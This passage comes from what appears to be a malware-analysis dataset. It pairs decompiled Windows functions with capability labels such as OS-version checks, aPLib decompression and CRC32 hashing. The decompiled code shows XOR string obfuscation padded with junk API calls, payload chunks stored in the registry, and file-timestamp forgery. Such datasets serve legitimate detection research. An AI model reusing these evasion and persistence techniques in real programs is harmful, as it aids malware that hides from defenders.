_sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_1ch = &var_18h - iVar4;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                    if (iVar3 != 0xa0a4b1) {\n                        *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_ch = iVar3 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            if (0 < var_4ch) {\n                var_ch = 0;\n                var_18h = 0x38326343;\n                var_14h = 0x41466639;\n                var_10h = 0x6366665c;\n                var_8h = 0x38416366;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x66);\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_24h = &var_18h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                        if (iVar3 != 0xa0a4b1) {\n                            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                    iVar6 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar6 = var_44h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_ch, iVar6);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_24h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_1ch = iVar3 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_1ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_58h;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_24h & 0xff;\n}\n",
        "token_count": 2167
    },
    "0040feb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040feb4(int32_t *param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    int32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uchar *var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_24h;\n    uint var_20h;\n    uchar *lpcbData;\n    uchar *var_18h;\n    int32_t hKey;\n    int32_t lpType;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_54h = param_1;\n    var_18h = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_50h = iVar3;\n        fcn.0040f9f1();\n        var_64h = fcn.0040f998(0x20019);\n        if (var_64h != 0) {\n            var_4ch = 0;\n            var_44h = 0x7a02542c;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_40h = 0x542f6c5f;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_3ch = 0x6c487a19;\n            var_38h._0_2_ = 0x5407;\n            lpType = 6;\n            var_38h._2_1_ = 6;\n            stack0xffffffc7 = 0x296c507a;\n            var_31h = 0x147a0e54;\n            var_2dh = 0x6b542a6c;\n            var_29h._0_1_ = 0x7a;\n            var_ch = 0x7a6b544e;\n            var_8h._0_2_ = 0x6c31;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_68h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                if (iVar4 != 0x72b799) {\n                    *(iVar8 + iVar3) = *(&var_ch + iVar8 % lpType) ^ (iVar8 + iVar3)[&var_44h - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, var_18h);\n            stack0xffffffd4 = 0x38326343;\n            var_24h = 0x41466639;\n            var_20h = 0x6366665c;\n            var_ch = 0x38416366;\n            var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x66);\n            do {\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar9 = &var_70h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                lpType = &var_29h + (1 - iVar3);\n                var_6ch = iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                    iVar4 = var_4ch;\n                    if (iVar5 != 0xa0a4b1) {\n                        hKey = 5;\n                        *(iVar8 + iVar3) = *(&var_ch + iVar8 % 5) ^ (iVar8 + iVar3)[lpType];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_4ch);\n                var_1h._0_1_ = '\\0';\n                var_48h = NULL;\n                var_4ch = iVar4 + 1;\n                var_18h = NULL;\n                hKey = fcn.0040f998(0x20019);\n                param_1 = var_54h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_5ch = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_5ch;\n                        puVar6 = var_5ch;\n                        if ((var_58h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_58h, &lpcbData),  puVar7 = var_58h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_48h = puVar7;\n                            var_18h = puVar6;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_48h != NULL)) && (var_18h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_18h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_18h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_48h;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_18h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_18h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_48h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_6ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_64h);\n            uVar2 = (*pcVar11)(0, var_68h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_50h;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2285
    },
    "00402ff1": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402ff1(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "00401a05": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401a05(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.00403bc2(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.0040f56a();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 399
    },
    "0040a771": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a771(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.0040a6ff();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x0040a813;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x0040a813;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040a813:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 608
    },
    "0040a855": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a855(uint lpLastWriteTime)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uchar var_29h;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar3 = *0x41dab0;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar7 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar7 % 0x1b + 1;\n    var_22h._2_2_ = uVar6 % 0x16 + 1;\n    uVar7 = uVar6 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar7 % 0x3b + 1;\n    var_1ch = uVar6 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar6 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime, lpLastWriteTime);\n    var_5ch._0_2_ = 0x454d;\n    var_10h = 5;\n    var_5ch._2_1_ = 5;\n    stack0xffffffa3 = 0x2b681057;\n    var_55h = 0x1793372;\n    var_51h = 0x5c570045;\n    var_4dh = 0x24721968;\n    var_49h = 0x1451179;\n    var_45h = 0x20680d57;\n    var_41h = 0x5b793a72;\n    var_3dh = 0x25574045;\n    var_39h = 0x3a722668;\n    var_35h = 0x5c450c79;\n    var_31h = 0x3d681c57;\n    var_2dh = 0x68793272;\n    var_29h = 0x45;\n    var_18h = 0x57724568;\n    var_14h._0_1_ = 0x79;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0x8459df) {\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % var_10h) ^ (iVar8 + iVar3)[&var_5ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.0040a6ff();\n    if (iVar8 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 1346
    },
    "0040aa7f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040aa7f(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.0040a6ff();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.0040a855(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 431
    },
    "0040b3fd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b3fd(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.0040b335();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 288
    },
    "0040bbc6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040bbc6(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040caaf();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00405f18(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.00405f9e(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41dd74 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.0040ba4a();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.0040ba4a();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 542
    },
    "0040d877": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d877(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41ddd8 = 1;\n    fcn.0040263b(param_1);\n    fcn.0040ae60();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41dd68);\n    if (iVar1 != -1) {\n        fcn.0040ae1f();\n    }\n    fcn.0040d404();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0040d315();\n    return;\n}\n",
        "token_count": 139
    },
    "004076ac": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004076ac(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_16ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0x3d2d3e20;\n    var_58h = 0x3401353c;\n    puVar6 = &var_16ch;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_54h = 0x37220417;\n    var_50h = 0x26383e01;\n    var_4ch._0_2_ = 0x202d;\n    var_4ch._2_1_ = 0x2f;\n    var_ch = 6;\n    var_4ch._3_1_ = 6;\n    var_48h = 0x3b2f2722;\n    var_44h = 0xa172204;\n    var_40h = 0x3401263e;\n    var_3ch = 0x311d3d25;\n    var_38h = 0x26222201;\n    var_34h = 0x3f3a0825;\n    var_30h = 0x3a392c3f;\n    var_2ch = 0x1a6b2516;\n    var_28h = 0x3807202e;\n    var_24h = 0x8382e25;\n    var_20h = 0x2c253e29;\n    var_1ch = 0x35560838;\n    var_18h._0_2_ = 0x4917;\n    var_8h = 0x494b5173;\n    var_4h._0_2_ = 0x544b;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_68h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar2 != 0xd7b499) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_5ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_8h = 0x5643605f;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x36);\n    var_14h = 0x6673556d;\n    var_10h._0_2_ = 0x7836;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_64h = &var_8h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        iVar2 = var_68h;\n        if (iVar3 != 0xd7e159) {\n            *(iVar5 + iVar4) = *(&var_14h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_8h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar3 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar4, 0, 4, &var_60h, 4);\n                